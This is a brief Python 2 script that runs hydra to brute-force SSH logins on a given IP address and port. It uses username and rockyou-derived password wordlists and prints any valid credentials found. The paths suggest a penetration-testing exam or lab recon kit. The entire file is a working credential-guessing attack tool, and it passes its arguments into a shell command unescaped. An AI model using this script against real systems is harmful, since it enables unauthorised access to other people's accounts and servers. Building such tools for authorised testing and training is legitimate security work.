#!/usr/bin/env python

# modified by forScience. Original by Mike Czumak (T_v3rn1x)
# paths have been customised

import subprocess
import sys

if len(sys.argv) != 3:
    print "Usage: sshrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

print "[+] Performing quick little hydra bruteforce against ssh on " + ip_address + "..."
HYDRA = "hydra -L /root/Tools/Wordlists/userlist_mini.txt -P /root/Tools/Wordlists/rockyou_mini.txt -t 4 -f -o /root/EXAM/myrecon/results/%s/SSH-%s-%s.hydra -u %s -s %s ssh" %(ip_address, port, ip_address, ip_address, port)
try:
    results = subprocess.check_output(HYDRA, shell=True, stderr=subprocess.STDOUT)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
            print "[!] Valid ssh credentials found: " + result
except:
    print "[!] No valid ssh credentials found for %s" %(ip_address)
